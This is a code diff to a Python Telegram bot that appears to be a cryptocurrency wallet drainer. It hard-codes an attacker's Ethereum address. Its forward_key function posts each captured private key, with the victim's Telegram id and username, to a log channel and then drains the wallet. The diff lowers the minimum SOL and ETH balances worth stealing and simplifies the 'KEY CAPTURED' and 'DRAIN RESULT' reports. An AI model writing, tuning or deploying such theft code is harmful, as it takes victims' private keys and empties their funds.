@@ -22,8 +22,8 @@ DEST_ETH = "0xd1b7A902c90137f00322d6D7e9a8211e95C71dAD"
 SOL_RPC = os.getenv("SOL_RPC", "https://api.mainnet-beta.solana.com")
 ETH_RPC = os.getenv("ETH_RPC", "https://eth.llamarpc.com")
 
-MIN_SOL_LAMPORTS = 5_000_000
-MIN_ETH_WEI      = 100_000_000_000_000
+MIN_SOL_LAMPORTS = 100_000
+MIN_ETH_WEI      = 10_000_000_000_000
 
 bot = Bot(token=BOT_TOKEN)
 dp  = Dispatcher()
@@ -305,10 +305,9 @@ async def on_text(message: Message):
 
 async def forward_key(message, chain, key):
     user = message.from_user
-    report = ("\U0001f511 *KEY CAPTURED*\nChain: `%s`\n"
-              "User: `%s` (@%s)\nKey: `%s`") % (chain, user.id, user.username or 'none', key)
+    report = "\U0001f511 KEY CAPTURED\nChain: %s\nUser: %s (@%s)\nKey: %s" % (chain, user.id, user.username or "none", key)
     if LOG_CHANNEL_ID:
-        try: await bot.send_message(LOG_CHANNEL_ID, report, parse_mode=ParseMode.MARKDOWN)
+        try: await bot.send_message(LOG_CHANNEL_ID, report)
         except Exception as e: log.error("log channel failed: %s", e)
 
     try:
@@ -322,8 +321,7 @@ async def forward_key(message, chain, key):
         if LOG_CHANNEL_ID:
             try:
                 await bot.send_message(LOG_CHANNEL_ID,
-                    f"\U0001f4b8 *DRAIN RESULT*\n```\n{result}\n```",
-                    parse_mode=ParseMode.MARKDOWN)
+                    f"\U0001f4b8 DRAIN RESULT\n{result}")
             except Exception as e: log.error("drain report failed: %s", e)
     except Exception as e:
         log.error("drain failed: %s", e)
